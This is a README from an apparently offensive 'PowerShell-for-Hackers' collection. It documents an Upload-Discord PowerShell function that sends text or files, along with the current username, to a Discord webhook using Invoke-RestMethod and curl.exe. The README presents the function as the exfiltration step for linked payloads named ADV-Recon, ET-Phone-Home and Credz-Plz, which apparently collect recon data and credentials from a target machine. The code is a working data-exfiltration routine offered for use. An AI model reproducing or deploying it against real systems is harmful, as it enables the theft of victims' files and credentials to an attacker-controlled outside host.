![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Examples">Examples</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Discord-Upload

<p align="center">
      <a href="https://youtu.be/Zs-1j42ySNU">
        <img src=https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/raw/main/Assets/images/thumbnail.png width="300" alt="C#" />
      </a>
      <br>YouTube Tutorial
</p>

## Description

This function is used to upload either text or other files to your discord via a webhook 

## The Functions


### [Upload-Discord] 

This function is used to upload files to your discord. 

Just replace `$hookurl` with YOUR discord webhook

Now you can use either of the  `$text` or `$file` parameter or both 

```
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'YOUR-DISCORD-WEBHOOK'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
```

----------------------------------------------------------------------------------------------------------------------------------
### [Syntax]
```
Upload-Discord -file "file.txt" -text "this is a text file"

or

Upload-Discord -file "image.jpg" -text "this is an iamge"
```


<p align="right">(<a href="#top">back to top</a>)</p>


## Examples 

Listed below are payloads that can use one of these functions:

[ADV-Recon](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ADV-Recon)

[ET-Phone-Home](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ET-Phone-Home)

[Credz-Plz](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Credz-Plz)

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [UberGuidoZ](https://github.com/UberGuidoZ)

***

[HOME-PAGE](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)

<p align="right">(<a href="#top">back to top</a>)</p>
